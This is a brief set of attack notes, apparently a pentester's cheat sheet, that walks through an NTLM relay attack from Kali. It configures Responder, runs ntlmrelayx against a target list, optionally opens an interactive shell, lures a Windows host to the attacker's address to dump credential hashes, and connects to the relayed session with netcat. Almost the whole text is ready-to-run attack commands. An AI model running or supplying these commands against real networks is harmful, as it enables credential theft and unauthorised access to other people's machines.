On Kali:

- make sure you have a file called targets

- Edit /etc/responder/Responder.conf
- Turn off SMB and HTTP
- Save

```
responder -I eth0 -dwv
```

- Open a new shell

```
ntlmrelayx.py -tf targets.txt -smb2support
```

OR

- For interactive shell

```
ntlmrelayx.py -tf targets.txt -smb2support -i
```

On Windows Target:

- Open browser and go to '/<ip_address>'

This should trigger a hash dump of credentials

On Kali:

- open new tab

```
nc 127.0.0.1 11000
```


